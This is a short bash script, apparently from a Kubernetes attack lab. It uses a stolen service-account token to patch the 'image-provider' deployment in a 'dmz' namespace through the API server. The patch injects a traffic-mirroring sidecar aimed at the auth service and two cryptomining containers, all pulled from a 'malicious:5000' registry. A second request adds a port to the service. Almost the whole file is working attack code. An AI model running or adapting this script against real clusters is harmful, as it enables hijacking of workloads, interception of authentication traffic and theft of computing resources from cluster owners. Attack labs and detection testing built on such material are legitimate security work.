#!/usr/bin/env bash

MIRRORADDR="${MIRRORADDR:-prova.dmz.svc.cluster.local:8080}"
ATTACKED_NS="${ATTACKED_NS:-"dmz"}"
TOKEN_PATH="$DATA_PATH/KC1/token"
TOKEN=$(cat ${TOKEN_PATH})
APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
IPAUTH=$(nslookup -type=A auth.$AUTH_NS | awk '/Address: /{print $2}')
TMP_FILE="$DATA_PATH/KC1/patch_sidecar.json"

# Installing dependencies and setup
apt-get update >/dev/null 2>&1
apt-get install -y --no-install-recommends curl jq ca-certificates >/dev/null 2>&1
mkdir -p $(dirname $TMP_FILE)


jq -n \
  --arg ipauth "$IPAUTH:8080" \
  --arg mirroraddr "$MIRRORADDR" '
[
  {
    "op":"add",
    "path":"/spec/template/spec/containers/-",
    "value":{
      "name":"sidecar-not-malicious",
      "image":"malicious:5000/sidecar-mal:2.0.2",
      "ports":[{"containerPort":8080}],
      "env":[
        {"name":"PRIMARY_ADDR","value":$ipauth},
        {"name":"MIRROR_ADDR","value":$mirroraddr}
      ]
    }
  },
  {
    "op":"add",
    "path":"/spec/template/spec/containers/-",
    "value":{
      "name":"sidecar-not-mining",
      "image":"malicious:5000/attacker:2.0.2",
      "env":[
        {"name":"GROUP","value":"mining"}
      ]
    }
  },
  {
    "op":"add",
    "path":"/spec/template/spec/containers/-",
    "value":{
      "name":"sidecar-not-mining2",
      "image":"malicious:5000/attacker:2.0.2",
      "env":[
        {"name":"GROUP","value":"mining"}
      ]
    }
  }
]' > $TMP_FILE

# Adding sidecars
curl -k -X PATCH \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json-patch+json" \
  --data @$TMP_FILE \
  "${APISERVER}/apis/apps/v1/namespaces/${ATTACKED_NS}/deployments/image-provider"

# Modify service
curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json-patch+json" \
  -X PATCH \
  "${APISERVER}/api/v1/namespaces/${ATTACKED_NS}/services/image-provider" \
  -d '[{"op":"add","path":"/spec/ports/-","value":{"port":8080,"targetPort":8080,"protocol":"TCP","name":"http-8080"}}]'

rm -f $TMP_FILE

echo "Containers deployed"